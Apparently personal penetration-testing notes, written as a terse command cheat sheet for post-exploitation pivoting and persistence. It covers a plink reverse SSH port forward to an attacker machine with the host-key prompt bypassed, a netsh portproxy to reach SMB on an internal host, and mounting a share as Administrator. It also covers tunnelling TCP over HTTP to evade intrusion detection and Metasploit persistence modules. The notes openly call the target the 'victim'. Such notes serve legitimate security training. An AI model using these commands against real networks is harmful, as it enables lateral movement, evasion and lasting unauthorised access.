
## port forwarding
# look for interfaces that are connected to other networks
ifconfig
# this is a tcp forwarding proxy, similar to the ones i used to write myself in njs and c
rinetd
# getting an ssh port forward is very powerful;
# it means you don't need any binaries running on the remote machine
# if all you want to do is interact with network services it can see
# especially including AD, SMB, and other windows protocol interactions.
# can also do some nmap port scanning via ssh port fwd.
# best minimalist ports to scan are probably https,http,ssh,smb,rdp.
# on windows
plink.exe -ssh -l USER -pw PASS -R 1.2.3.4:1234:127.0.0.1:4567 5.6.7.8
# provides ssh port-forward support with similar syntax.
# so two essential windows binaries i should have ready to xfer: nc.exe, plink.exe
# however the plink bin asks for user interactive tty confirm for remote host fingerprint, which can be bypassed on cli like:
cmd.exe /c echo y | plink.exe ...
# so we don't need an openssh service on the victim, when we can just install a client and connect to ourselves as malicious host

# there is a similar utiity on windows for port-forwarding the SMB protocol
# every modern version of windows offers built-in `netsh` client
# must have "IP Helper" svc running, and ipv6 support must be enabled on the interface
# also must have privilege to bypass UAC
cd C:\windows\system32
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
netstat -anp TCP | find 4455
# if using smbclient on linux, may need to set 
min protocol = SMB2
# because modern windows os require it
# attempting to mount a share from linux client to windows smb
mkdir a
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=evil ./a
# this ties into netsh port fwd above

# can also tunnel/forward arbitrary tcp traffic OVER http (presumably could do over any protocol with the right tool. e.g., DNS, ICMP)
# ie. when a proxy/fw is the only available svc and the data must appear as valid http request
#     and when you can install a listener on the target
# ie. or, when you want to bypass an IDPS
sudo apt install httptunnel
# server; goes on victim
man hts
# client; proxies from attacker localhost
man htc



## Persistence
meterpreter> run persistence -h
meterpreter> run scheduleme
meterpreter> run schtasksabuse
meterpreter> run metsvc -A
msf> use exploit/windows/local/persistence
msf> use exploit/windows/local/registry_persistence